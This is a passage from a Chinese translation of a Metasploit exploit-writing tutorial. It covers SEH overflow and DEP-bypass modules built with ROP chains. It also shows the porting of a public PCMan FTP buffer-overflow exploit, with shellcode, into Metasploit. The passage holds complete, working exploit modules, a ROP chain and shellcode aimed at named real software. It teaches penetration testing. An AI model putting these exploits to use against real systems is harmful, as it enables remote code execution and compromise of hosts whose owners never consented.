Mona 脚本是 Immunity Debugger 的 Python 驱动插件，提供了各种利用选项。该脚本可以从以下网址下载：[`github.com/corelan/mona/blob/master/mona.py`](https://github.com/corelan/mona/blob/master/mona.py)。将脚本放入`\Program Files\Immunity Inc\Immunity Debugger\PyCommands`目录中即可轻松安装。

现在让我们使用 Mona 并运行`!mona modules`命令来分析 DLL 文件，如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/5de60269-f16b-4189-9753-d8c23383de07.png)

从前面的截图中可以看出，我们只有很少的没有实现 SafeSEH 机制的 DLL 文件。让我们使用这些文件来找到 POP/POP/RET 指令的相关地址。

有关 Mona 脚本的更多信息，请访问：[`www.corelan.be/index.php/2011/07/14/mona-py-the-manual/`](https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/)。

# 使用 msfpescan

我们可以使用`msfpescan`的`-s`开关轻松找到`ImageLoad.dll`文件中的 POP/POP/RET 指令序列。让我们使用它。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/5ad5e795-2155-47f0-b223-6c82bd0e9d4d.png)

让我们使用一个安全地址，消除可能导致 HTTP 协议问题的地址，比如连续重复的零，如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/71da2ab5-e7dc-4092-9ce3-df3e361b7481.png)

我们将使用`0x10019798`作为 POP/POP/RET 地址。现在我们已经有了撰写利用程序的两个关键组件，即偏移量和要加载到 catch 块中的地址，即我们的 POP/POP/RET 指令的地址。我们只需要短跳转的指令，这将被加载到下一个 SEH 记录的地址，这将帮助我们跳转到 shellcode。Metasploit 库将使用内置函数为我们提供短跳转指令。

# 编写 Metasploit SEH 利用模块

现在我们已经有了利用目标应用程序的所有重要数据，让我们继续在 Metasploit 中创建一个利用模块，如下：

```
class MetasploitModule < Msf::Exploit::Remote 

  Rank = NormalRanking 

  include Msf::Exploit::Remote::Tcp 
  include Msf::Exploit::Seh 

  def initialize(info = {}) 
    super(update_info(info, 
      'Name'           => 'Easy File Sharing HTTP Server 7.2 SEH Overflow', 
      'Description'    => %q{ 
        This module demonstrate SEH based overflow example 
      }, 
      'Author'         => 'Nipun', 
      'License'        => MSF_LICENSE, 
      'Privileged'     => true, 
      'DefaultOptions' => 
        { 
          'EXITFUNC' => 'thread', 
     'RPORT' => 80, 
        }, 
      'Payload'        => 
        { 
          'Space'    => 390, 
          'BadChars' => "x00x7ex2bx26x3dx25x3ax22x0ax0dx20x2fx5cx2e", 
        }, 
      'Platform'       => 'win', 
      'Targets'        => 
        [ 
          [ 'Easy File Sharing 7.2 HTTP', { 'Ret' => 0x10019798, 'Offset' => 4061 } ], 
        ], 
      'DisclosureDate' => 'Mar 4 2018', 
      'DefaultTarget'  => 0)) 
  end 
```

在处理各种模块的头部部分后，我们开始包含库文件的所需部分。接下来，我们定义类和模块类型，就像我们在之前的模块中所做的那样。我们通过定义名称、描述、作者信息、许可信息、有效载荷选项、披露日期和默认目标来开始`initialize`部分。我们在`Ret`返回地址变量和`Offset`字段下使用`4061`作为 POP/POP/RET 指令的地址。我们使用`4061`而不是`4065`，因为 Metasploit 将自动生成短跳转指令到 shellcode；因此，我们将从`4065`字节前开始 4 个字节，以便将短跳转放入载体中，以用于下一个 SEH 记录的地址。

在继续之前，让我们看一下我们将在模块中使用的重要函数。我们已经看到了`make_nops`、`connect`、`disconnect`和`handler`的用法：

| **函数** | **库** | **用法** |
| --- | --- | --- |
| `generate_seh_record()` | `/lib/msf/core/exploit/seh.rb` | 这个库提供了生成 SEH 记录的方法。 |

让我们继续编写代码，如下：

```
def exploit 
  connect 
  weapon = "HEAD " 
  weapon << make_nops(target['Offset']) 
  weapon << generate_seh_record(target.ret) 
  weapon << make_nops(19) 
  weapon << payload.encoded 
  weapon << " HTTP/1.0rnrn" 
  sock.put(weapon) 
  handler 
  disconnect 
  end 
end 
```

`exploit`函数首先通过连接到目标开始。接下来，它通过在`HEAD`请求中附加`4061`个 NOP 生成一个恶意的`HEAD`请求。接下来，`generate_seh_record()`函数生成一个`8`字节的`SEH`记录，其中前 4 个字节形成了跳转到有效载荷的指令。通常，这 4 个字节包含诸如`\xeb\x0A\x90\x90`的指令，其中`\xeb`表示跳转指令，`\x0A`表示要跳转的`12`字节，而`\x90\x90 NOP`指令则作为填充完成了 4 个字节。

# 使用 NASM shell 编写汇编指令

Metasploit 提供了一个使用 NASM shell 编写短汇编代码的绝佳工具。在上一节中，我们编写了一个小的汇编代码`\xeb\x0a`，它表示了一个 12 字节的短跳转。然而，在消除了搜索互联网或切换汇编操作码的使用后，我们可以使用 NASM shell 轻松编写汇编代码。

在前面的示例中，我们有一个简单的汇编调用，即`JMP SHORT 12`。然而，我们不知道与此指令匹配的操作码是什么。因此，让我们使用 NASM shell 来找出，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/6f8fe2cf-7991-429b-aaeb-734accd15ea4.png)

在前面的屏幕截图中，我们可以看到我们从`/usr/share/Metasploit-framework/tools/exploit`目录中启动了`nasm_shell.rb`，然后简单地输入了生成相同操作码`EB0A`的命令，这是我们之前讨论过的。因此，我们可以在所有即将到来的利用示例和实际练习中使用 NASM shell，以减少工作量并节省大量时间。

回到主题，Metasploit 允许我们跳过提供跳转指令和字节数到有效载荷的任务，使用`generate_seh_record()`函数。接下来，我们只需在有效载荷之前提供一些填充以克服任何不规则性，并跟随有效载荷。最后，我们在头部使用`HTTP/1.0\r\n\r\n`完成请求。最后，我们将存储在变量 weapon 中的数据发送到目标，并调用处理程序方法来检查尝试是否成功，并且我们获得了对目标的访问权限。

让我们尝试运行模块并分析行为，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/76cda35c-2294-4901-9ef5-29553e382704.png)

让我们为模块设置所有必需的选项，并运行`exploit`命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/6617dc64-4149-4132-8cee-8ddf1250432f.png)

砰！我们成功地利用了目标，这是一个 Windows 7 系统。我们看到了在 Metasploit 中创建 SEH 模块是多么容易。在下一节中，我们将深入研究绕过 DEP 等安全机制的高级模块。

有关 SEH mixin 的更多信息，请参阅[`github.com/rapid7/metasploit-framework/wiki/How-to-use-the-Seh-mixin-to-exploit-an-exception-handler`](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-the-Seh-mixin-to-exploit-an-exception-handler)。

# 绕过 Metasploit 模块中的 DEP

**数据执行防护**（**DEP**）是一种保护机制，它将特定内存区域标记为不可执行，导致在利用时不执行 shellcode。因此，即使我们可以覆盖 EIP 寄存器并将 ESP 指向 shellcode 的起始位置，我们也无法执行我们的有效载荷。这是因为 DEP 防止在内存的可写区域（如堆栈和堆）中执行数据。在这种情况下，我们需要使用可执行区域中的现有指令来实现所需的功能。我们可以通过将所有可执行指令按照一定顺序排列，使得跳转到 shellcode 成为可能。

绕过 DEP 的技术称为**返回导向编程**（**ROP**）。ROP 与普通的堆栈溢出不同，普通的堆栈溢出只需要覆盖 EIP 并调用跳转到 shellcode。当 DEP 启用时，我们无法这样做，因为堆栈中的数据是不可执行的。在这里，我们将调用第一个 ROP 小工具，而不是跳转到 shellcode，这些小工具应该被设置成这样的结构，它们形成一个链接结构，其中一个小工具返回到下一个小工具，而不会执行任何来自堆栈的代码。

在接下来的部分中，我们将看到如何找到 ROP 小工具，这些指令可以执行寄存器上的操作，然后返回（`RET`）指令。找到 ROP 小工具的最佳方法是在加载的模块（DLL）中寻找它们。这些小工具的组合形成了一个链式结构，从堆栈中依次取出一个地址并返回到下一个地址，这些链式结构被称为 ROP 链。

我们有一个易受堆栈溢出攻击的示例应用程序。用于覆盖 EIP 的偏移值为 2006。让我们看看当我们使用 Metasploit 利用这个应用程序时会发生什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/a8257a82-1559-485b-81b8-51473cb4d7e4.png)

我们可以看到我们轻松地获得了一个 Meterpreter shell。让我们通过从系统属性中导航到高级系统属性来在 Windows 中启用 DEP，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/1fd448d5-a14e-40ed-8c4d-4bdb79ffa9e7.png)

我们通过选择对所有程序和服务启用 DEP，除了我选择的那些，来启用 DEP。让我们重新启动系统，并尝试利用相同的漏洞，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/d19ebd28-fd05-4b24-af6a-2ef5a65a4d5d.png)

我们可以看到我们的利用失败了，因为 shellcode 没有被执行。

您可以从以下网址下载示例应用程序：[`www.thegreycorner.com/2010/12/introducing-vulnserver.html`](http://www.thegreycorner.com/2010/12/introducing-vulnserver.html)。

在接下来的部分中，我们将看到如何使用 Metasploit 绕过 DEP 的限制，并访问受保护的系统。让我们保持 DEP 启用，将相同的易受攻击的应用程序附加到调试器，并检查其可执行模块，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/df7cc20b-64f2-411f-8dac-997886a437c8.png)

使用 Mona 脚本，就像我们之前做的那样，我们可以使用`!mona modules`命令找到所有模块的信息。然而，要构建 ROP 链，我们需要在这些 DLL 文件中找到所有可执行的 ROP 小工具。

# 使用 msfrop 查找 ROP 小工具

Metasploit 提供了一个非常方便的工具来查找 ROP 小工具：`msfrop`。它不仅使我们能够列出所有的 ROP 小工具，还允许我们通过这些小工具来寻找我们所需操作的适当小工具。假设我们需要查看所有可以帮助我们执行对`ECX`寄存器的弹出操作的小工具。我们可以使用`msfrop`来做到这一点，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/b26f0e56-3daf-4848-a42b-0e3289dfe707.png)

只要我们为搜索提供了`-s`开关，并为详细输出提供了`-v`，我们就开始获得所有使用 POP ECX 指令的小工具的列表。让我们看看结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/cae599b6-1754-4486-915b-d67b673fecec.png)

我们可以看到，我们有各种各样的小工具可以轻松执行 POP ECX 任务。然而，要构建一个成功的 Metasploit 模块，可以在 DEP 存在的情况下利用目标应用程序，我们需要开发一系列这些 ROP 小工具，而不执行任何来自堆栈的内容。让我们通过以下图表了解 DEP 的 ROP 绕过：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/9ae8c704-8223-47e1-a1a1-8414361dc207.png)

在左侧，我们有一个标准应用程序的布局。在中间，我们有一个使用缓冲区溢出漏洞受到攻击的应用程序，导致 EIP 寄存器被覆盖。在右侧，我们有 DEP 绕过的机制，我们不是用 JMP ESP 地址覆盖 EIP，而是用 ROP gadget 的地址覆盖它，然后是另一个 ROP gadget，依此类推，直到执行 shellcode。

指令执行如何绕过硬件启用的 DEP 保护？

答案很简单。诀窍在于将这些 ROP gadgets 链接起来调用`VirtualProtect()`函数，这是一个用于使堆栈可执行的内存保护函数，以便 shellcode 可以执行。让我们看看我们需要执行哪些步骤才能使利用在 DEP 保护下工作：

1.  找到 EIP 寄存器的偏移量

1.  用第一个 ROP gadget 覆盖寄存器

1.  继续用其余的 gadgets 覆盖，直到 shellcode 变得可执行

1.  执行 shellcode

# 使用 Mona 创建 ROP 链

使用 Immunity Debugger 的 Mona 脚本，我们可以找到 ROP gadgets。然而，它还提供了自己创建整个 ROP 链的功能，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/488269bb-b3c7-4609-b3de-0c7cbb5f008a.png)

在 Immunity Debugger 的控制台中使用`!mona rop -m *.dll -cp nonull`命令，我们可以找到关于 ROP gadgets 的所有相关信息。我们可以看到 Mona 脚本生成了以下文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/fb4f21a9-c0ad-43e5-99dd-cdeb145d080b.png)

有趣的是，我们有一个名为`rop_chains.txt`的文件，其中包含可以直接在利用模块中使用的整个链。该文件包含了在 Python、C 和 Ruby 中创建的用于 Metasploit 的 ROP 链。我们只需要将 ROP 链复制到我们的利用中，就可以了。

为触发`VirtualProtect()`函数创建 ROP 链，我们需要以下寄存器的设置：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/a949b3aa-4cb1-4243-99c3-5745db324264.png)

让我们看一下 Mona 脚本创建的 ROP 链，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/80399eaa-788b-46d3-9749-d46e0614de54.png)

我们在`rop_chains.txt`文件中有一个完整的`create_rop_chain`函数，用于 Metasploit。我们只需要将这个函数复制到我们的利用中。

# 编写 DEP 绕过的 Metasploit 利用模块

在这一部分，我们将为同一个易受攻击的应用程序编写 DEP 绕过利用，我们在利用栈溢出漏洞时失败了，因为 DEP 已启用。该应用程序在 TCP 端口`9999`上运行。因此，让我们快速构建一个模块，并尝试在同一应用程序上绕过 DEP：

```
class MetasploitModule < Msf::Exploit::Remote 
  Rank = NormalRanking 

  include Msf::Exploit::Remote::Tcp 

  def initialize(info = {}) 
    super(update_info(info, 
      'Name'                 => 'DEP Bypass Exploit', 
      'Description'    => %q{ 
         DEP Bypass Using ROP Chains Example Module 
      }, 
      'Platform'             => 'win', 
      'Author'         => 
        [ 
          'Nipun Jaswal' 
        ], 
      'Payload' => 
      { 
      'space' => 312, 
      'BadChars' => "\x00", 
      }, 
      'Targets' => 
       [ 
                  ['Windows 7 Professional',{ 'Offset' => 2006}] 
       ], 
      'DisclosureDate' => 'Mar 4 2018' 
   )) 
   register_options( 
   [ 
         Opt::RPORT(9999) 
   ]) 
  end 
```

我们已经编写了许多模块，并对所需的库和初始化部分非常熟悉。此外，我们不需要返回地址，因为我们使用的是自动构建机制跳转到 shellcode 的 ROP 链。让我们专注于利用部分：

```
def create_rop_chain() 

    # rop chain generated with mona.py - www.corelan.be 
    rop_gadgets =  
    [ 
      0x77dfb7e4,  # POP ECX # RETN [RPCRT4.dll]  
      0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll] 
      0x76a5fd52,  # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll]  
      0x766a70d7,  # POP EBP # RETN [USP10.dll]  
      0x625011bb,  # & jmp esp [essfunc.dll] 
      0x777f557c,  # POP EAX # RETN [msvcrt.dll]  
      0xfffffdff,  # Value to negate, will become 0x00000201 
      0x765e4802,  # NEG EAX # RETN [user32.dll]  
      0x76a5f9f1,  # XCHG EAX,EBX # RETN [MSCTF.dll]  
      0x7779f5d4,  # POP EAX # RETN [msvcrt.dll]  
      0xffffffc0,  # Value to negate, will become 0x00000040 
      0x765e4802,  # NEG EAX # RETN [user32.dll]  
      0x76386fc0,  # XCHG EAX,EDX # RETN [kernel32.dll]  
      0x77dfd09c,  # POP ECX # RETN [RPCRT4.dll]  
      0x62504dfc,  # &Writable location [essfunc.dll] 
      0x77e461e1,  # POP EDI # RETN [RPCRT4.dll]  
      0x765e4804,  # RETN (ROP NOP) [user32.dll] 
      0x777f3836,  # POP EAX # RETN [msvcrt.dll]  
      0x90909090,  # nop 
      0x77d43c64,  # PUSHAD # RETN [ntdll.dll]  
    ].flatten.pack("V*") 

    return rop_gadgets 

  end 
  def exploit 
    connect 
    rop_chain = create_rop_chain() 
    junk = rand_text_alpha_upper(target['Offset']) 
    buf = "TRUN ."+junk + rop_chain  + make_nops(16) + payload.encoded+'rn' 
    sock.put(buf) 
    handler 
    disconnect 
  end 
end 
```

我们可以看到，我们将 Mona 脚本生成的`rop_chains.txt`文件中的整个`create_rop_chain`函数复制到了我们的利用中。

我们通过连接到目标开始利用方法。然后，我们调用`create_rop_chain`函数，并将整个链存储在一个名为`rop_chain`的变量中。

接下来，我们使用`rand_text_alpha_upper`函数创建一个包含`2006`个字符的随机文本，并将其存储在一个名为`junk`的变量中。该应用程序的漏洞在于执行`TRUN`命令。因此，我们创建一个名为`buf`的新变量，并存储`TRUN`命令，后跟包含`2006`个随机字符的`junk`变量，再跟我们的`rop_chain`。我们还添加了一些填充，最后将 shellcode 添加到`buf`变量中。

接下来，我们只需将`buf`变量放到通信通道`sock.put`方法中。最后，我们只需调用处理程序来检查是否成功利用。

让我们运行这个模块，看看我们是否能够利用系统：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/671993e2-7b00-4d79-b1ab-68672df8b82b.png)

哇！我们轻松地通过了 DEP 保护。现在我们可以对受损目标进行后期利用。

# 其他保护机制

在本章中，我们基于基于堆栈的漏洞开发了利用程序，在我们的利用过程中，我们绕过了 SEH 和 DEP 保护机制。还有许多其他保护技术，如地址空间布局随机化（ASLR）、堆栈 cookie、SafeSEH、SEHOP 等。我们将在本书的后续部分中看到这些技术的绕过技术。然而，这些技术将需要对汇编、操作码和调试有出色的理解。

参考一篇关于绕过保护机制的优秀教程：[`www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/`](https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/)。

有关调试的更多信息，请参考：[`resources.infosecinstitute.com/debugging-fundamentals-for-exploit-development/`](http://resources.infosecinstitute.com/debugging-fundamentals-for-exploit-development/)。

# 总结

在本章中，我们首先介绍了在 Metasploit 中编写利用程序的汇编基础知识，一般概念以及它们在利用中的重要性。我们深入讨论了基于堆栈的溢出、基于 SEH 的堆栈溢出以及绕过 DEP 等保护机制的细节。我们还介绍了 Metasploit 中各种方便的工具，以帮助利用过程。我们还看了坏字符和空间限制的重要性。

现在，我们可以借助支持工具执行诸如在 Metasploit 中编写软件的利用之类的任务，确定必要的寄存器，覆盖它们的方法，并打败复杂的保护机制。

在进行下一章之前，可以尝试完成以下一组练习：

+   尝试在 exploit-db.com 上找到仅适用于 Windows XP 系统的利用程序，并使其在 Windows 7/8/8.1 上可用

+   从[`exploit-db.com/`](https://exploit-db.com/)中至少获取 3 个 POC 利用程序，并将它们转换为完全可用的 Metasploit 利用模块

+   开始向 Metasploit 的 GitHub 存储库做出贡献，并 fork 主要实例

在下一章中，我们将查看目前在 Metasploit 中尚不可用的公开可用的利用程序。我们将尝试将它们移植到 Metasploit 框架中。


# 第十四章：移植利用

在前一章中，我们讨论了如何在 Metasploit 中编写利用。然而，在已经有公开利用的情况下，我们不需要为特定软件创建利用。公开可用的利用可能是 Perl、Python、C 或其他不同编程语言中的。现在让我们发现一些将利用移植到 Metasploit 框架中的策略。这种机制使我们能够将现有利用转换为与 Metasploit 兼容的利用，从而节省时间并使我们能够随时切换有效载荷。在本章结束时，我们将了解以下主题：

+   从各种编程语言移植利用

+   从独立利用中发现基本要素

+   从现有独立扫描器/工具脚本创建 Metasploit 模块

如果我们能够找出现有利用中哪些基本要素可以在 Metasploit 中使用，那么将脚本移植到 Metasploit 框架中就是一项简单的工作。

将利用移植到 Metasploit 的这一想法通过使独立脚本能够在广泛的网络上运行而不仅仅是单个系统上，从而节省时间。此外，由于每个利用都可以从 Metasploit 中访问，这使得渗透测试更有组织性。让我们了解如何在即将到来的章节中使用 Metasploit 实现可移植性。

# 导入基于堆栈的缓冲区溢出利用

在即将到来的示例中，我们将看到如何将用 Python 编写的利用导入 Metasploit。公开可用的利用可以从以下网址下载：[`www.exploit-db.com/exploits/31255/`](https://www.exploit-db.com/exploits/31255/)。让我们按照以下方式分析利用：

```
import socket as s 
from sys import argv 

host = "127.0.0.1" 
fuser = "anonymous" 
fpass = "anonymous" 
junk = '\x41' * 2008 
espaddress = '\x72\x93\xab\x71' 
nops = 'x90' * 10 
shellcode= ("\xba\x1c\xb4\xa5\xac\xda\xda\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x33\x31\x53\x12\x83\xeb\xfc\x03\x4f\xba\x47\x59\x93\x2a\x0e"
"\xa2\x6b\xab\x71\x2a\x8e\x9a\xa3\x48\xdb\x8f\x73\x1a\x89\x23"
"\xff\x4e\x39\xb7\x8d\x46\x4e\x70\x3b\xb1\x61\x81\x8d\x7d\x2d"
"\x41\x8f\x01\x2f\x96\x6f\x3b\xe0\xeb\x6e\x7c\x1c\x03\x22\xd5"
"\x6b\xb6\xd3\x52\x29\x0b\xd5\xb4\x26\x33\xad\xb1\xf8\xc0\x07"
"\xbb\x28\x78\x13\xf3\xd0\xf2\x7b\x24\xe1\xd7\x9f\x18\xa8\x5c"
"\x6b\xea\x2b\xb5\xa5\x13\x1a\xf9\x6a\x2a\x93\xf4\x73\x6a\x13"
"\xe7\x01\x80\x60\x9a\x11\x53\x1b\x40\x97\x46\xbb\x03\x0f\xa3"
"\x3a\xc7\xd6\x20\x30\xac\x9d\x6f\x54\x33\x71\x04\x60\xb8\x74"
"\xcb\xe1\xfa\x52\xcf\xaa\x59\xfa\x56\x16\x0f\x03\x88\xfe\xf0"
"\xa1\xc2\xec\xe5\xd0\x88\x7a\xfb\x51\xb7\xc3\xfb\x69\xb8\x63"
"\x94\x58\x33\xec\xe3\x64\x96\x49\x1b\x2f\xbb\xfb\xb4\xf6\x29"
"\xbe\xd8\x08\x84\xfc\xe4\x8a\x2d\x7c\x13\x92\x47\x79\x5f\x14"
"\xbb\xf3\xf0\xf1\xbb\xa0\xf1\xd3\xdf\x27\x62\xbf\x31\xc2\x02"
 "\x5a\x4e")

sploit = junk+espaddress+nops+shellcode
conn = s.socket(s.AF_INET,s.SOCK_STREAM)
conn.connect((host,21))
conn.send('USER '+fuser+'\r\n')
uf = conn.recv(1024)
conn.send('PASS '+fpass+'\r\n')
pf = conn.recv(1024)
conn.send('CWD '+sploit+'\r\n')
cf = conn.recv(1024)
conn.close()

```

这个简单的利用通过匿名凭据登录到端口`21`上的 PCMAN FTP 2.0 软件，并使用`CWD`命令利用软件。

前一个利用的整个过程可以分解为以下一系列要点：

1.  将用户名、密码和主机存储在`fuser`、`pass`和`host`变量中。

1.  将`junk`变量分配为`2008`个 A 字符。这里，`2008`是覆盖 EIP 的偏移量。

1.  将 JMP ESP 地址分配给`espaddress`变量。这里，`espaddress 0x71ab9372`是目标返回地址。

1.  在`nops`变量中存储 10 个 NOPs。

1.  将执行计算器的有效载荷存储在`shellcode`变量中。

1.  将`junk`、`espaddress`、`nops`和`shellcode`连接起来，并将它们存储在`sploit`变量中。

1.  使用`s.socket(s.AF_INET,s.SOCK_STREAM)`建立套接字，并使用`connect((host,21))`连接到端口 21 的主机。

1.  使用`USER`和`PASS`提供`fuser`和`fpass`以成功登录到目标。

1.  发出`CWD`命令，然后跟上`sploit`变量。这将导致在偏移量为`2008`处覆盖 EIP，并弹出计算器应用程序。

1.  让我们尝试执行利用并分析结果如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/2167f364-4221-4433-8a30-d9a6e721d154.png)

原始利用从命令行获取用户名、密码和主机。然而，我们修改了机制，使用了固定的硬编码值。

一旦我们执行了利用，就会出现以下屏幕：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/13f57961-9c6e-4e48-a1ea-33d9ee9819cc.png)

我们可以看到计算器应用程序已经弹出，这表明利用正在正确工作。

# 收集基本要素

让我们找出从前面的利用中需要获取哪些基本值，以便从下表中生成 Metasploit 中等效模块：

| **序列号** | **变量** | **值** |
| --- | --- | --- |
| 1 | 偏移值 | `2008` |
| 2 | 使用 JMP ESP 搜索在可执行模块中找到的目标返回/跳转地址/值 | `0x71AB9372` |
| 3 | 目标端口 | `21` |
| 4 | 用于删除不规则性的前导 NOP 字节到 shellcode 的数量 | `10` |
| 5 | 逻辑 | `CWD`命令后跟着 2008 字节的垃圾数据，然后是 EIP、NOPs 和 shellcode |

我们有构建 Metasploit 模块所需的所有信息。在下一节中，我们将看到 Metasploit 如何辅助 FTP 进程以及在 Metasploit 中创建利用模块有多么容易。

# 生成一个 Metasploit 模块

构建 Metasploit 模块的最佳方法是复制现有的类似模块并对其进行更改。但是，`Mona.py`脚本也可以动态生成特定于 Metasploit 的模块。我们将在本书的后面部分看到如何使用`Mona.py`脚本生成快速利用。

现在让我们看一下 Metasploit 中利用的等效代码：

```
class MetasploitModule < Msf::Exploit::Remote 
  Rank = NormalRanking 

  include Msf::Exploit::Remote::Ftp 

  def initialize(info = {}) 
    super(update_info(info, 
      'Name'           => 'PCMAN FTP Server Post-Exploitation CWD Command', 
      'Description'    => %q{ 
          This module exploits a buffer overflow vulnerability in PCMAN FTP 
      }, 
      'Author'         => 
          [ 
            'Nipun Jaswal' 
          ], 
      'DefaultOptions' => 
        { 
          'EXITFUNC' => 'process', 
          'VERBOSE'  => true 
        }, 
      'Payload'        => 
        { 
          'Space'   => 1000, 
          'BadChars'  => "\x00\xff\x0a\x0d\x20\x40", 
        }, 
      'Platform'       => 'win', 
      'Targets'        => 
        [ 
          [ 'Windows XP SP2 English', 
            { 
              'Ret' => 0x71ab9372, 
              'Offset' => 2008 
            } 
          ], 
        ], 
      'DisclosureDate' => 'May 9 2016', 
      'DefaultTarget'  => 0)) 
register_options( 
        [ 
                Opt::RPORT(21), 
         OptString.new('FTPPASS', [true, 'FTP Password', 'anonymous']) 
        ]) 
  End 
```

在上一章中，我们处理了许多利用模块。这个利用也不例外。我们首先包含了所有必需的库和`/lib/msf/core/exploit`目录中的`ftp.rb`库。接下来，在`initialize`部分中分配了所有必要的信息。从利用中收集必要的信息后，我们将`Ret`分配为返回地址，并将`Offset`设置为`2008`。我们还将`FTPPASS`选项的值声明为`'anonymous'`。让我们看看下一节代码：

```
def exploit 
    c = connect_login 
    return unless c 
    sploit = rand_text_alpha(target['Offset']) 
    sploit << [target.ret].pack('V') 
    sploit << make_nops(10) 
    sploit << payload.encoded 
    send_cmd( ["CWD " + sploit, false] ) 
    disconnect 
  end 
end 
```

`connect_login`方法将连接到目标并尝试使用我们提供的匿名凭据登录软件。但等等！我们什么时候提供了凭据？模块的`FTPUSER`和`FTPPASS`选项会自动启用，包括 FTP 库。`FTPUSER`的默认值是`anonymous`。但是，对于`FTPPASS`，我们已经在`register_options`中提供了值`anonymous`。

接下来，我们使用`rand_text_alpha`生成`2008`的垃圾数据，使用`Targets`字段中的`Offset`值，并将其存储在`sploit`变量中。我们还使用`pack('V')`函数将`Targets`字段中的`Ret`值以小端格式存储在`sploit`变量中。将`make_nop`函数生成的 NOP 连接到 shellcode 中，我们将其存储到`sploit`变量中。我们的输入数据已经准备好供应。

接下来，我们只需使用 FTP 库中的`send_cmd`函数将`sploit`变量中的数据发送到`CWD`命令的目标。那么，Metasploit 有什么不同之处呢？让我们看看：

+   我们不需要创建垃圾数据，因为`rand_text_aplha`函数已经为我们完成了。

+   我们不需要以小端格式提供`Ret`地址，因为`pack('V')`函数帮助我们转换了它。

+   我们从未需要手动指定 NOP，因为`make_nops`会自动为我们完成。

+   我们不需要提供任何硬编码的 shellcode，因为我们可以在运行时决定和更改有效载荷。这样可以节省时间，消除了对 shellcode 的手动更改。

+   我们简单地利用 FTP 库创建并连接套接字。

+   最重要的是，我们不需要使用手动命令连接和登录，因为 Metasploit 使用单个方法`connect_login`为我们完成了这些。

# 利用 Metasploit 对目标应用程序

我们看到使用 Metasploit 比现有的利用更有益。让我们利用应用程序并分析结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/dade4e48-05f5-4b43-879d-808fcfc4b1db.png)

我们可以看到`FTPPASS`和`FTPUSER`已经设置为`anonymous`。让我们按照以下方式提供`RHOST`和有效载荷类型来利用目标机器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/526769ad-65ee-4cc0-8748-fb6ed698e058.png)

我们可以看到我们的利用成功执行。Metasploit 还提供了一些额外的功能，使利用更加智能。我们将在下一节看到这些功能。

# 在 Metasploit 中实现利用的检查方法

在 Metasploit 中，可以在利用易受攻击的应用程序之前检查易受攻击的版本。这非常重要，因为如果目标运行的应用程序版本不易受攻击，可能会导致应用程序崩溃，利用目标的可能性变为零。让我们编写一个示例检查代码，检查我们在上一节中利用的应用程序的版本。

```
  def check 
    c = connect_login 
    disconnect 
    if c and banner =~ /220 PCMan's FTP Server 2\.0/ 
      vprint_status("Able to authenticate, and banner shows the vulnerable version") 
      return Exploit::CheckCode::Appears 
     elsif not c and banner =~ /220 PCMan's FTP Server 2\.0/ 
      vprint_status("Unable to authenticate, but banner shows the vulnerable version") 
      return Exploit::CheckCode::Appears 
    end 
    return Exploit::CheckCode::Safe 
  end 
```

我们通过调用`connect_login`方法开始`check`方法。这将建立与目标的连接。如果连接成功并且应用程序返回横幅，我们将使用正则表达式将其与受影响的应用程序的横幅进行匹配。如果匹配成功，我们将使用`Exploit::Checkcode::Appears`标记应用程序为易受攻击。但是，如果我们无法进行身份验证但横幅是正确的，我们将返回相同的`Exploit::Checkcode::Appears`值，表示应用程序易受攻击。如果所有这些检查都失败，我们将返回`Exploit::CheckCode::Safe`，标记应用程序为不易受攻击。

通过发出`check`命令，让我们看看应用程序是否易受攻击：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/104c9107-d4f9-41c9-8fd3-c546231d8ae3.png)

我们可以看到应用程序是易受攻击的。我们可以继续进行利用。

有关实现`check`方法的更多信息，请参阅：[`github.com/rapid7/metasploit-framework/wiki/How-to-write-a-check%28%29-method`](https://github.com/rapid7/metasploit-framework/wiki/How-to-write-a-check%28%29-method)。

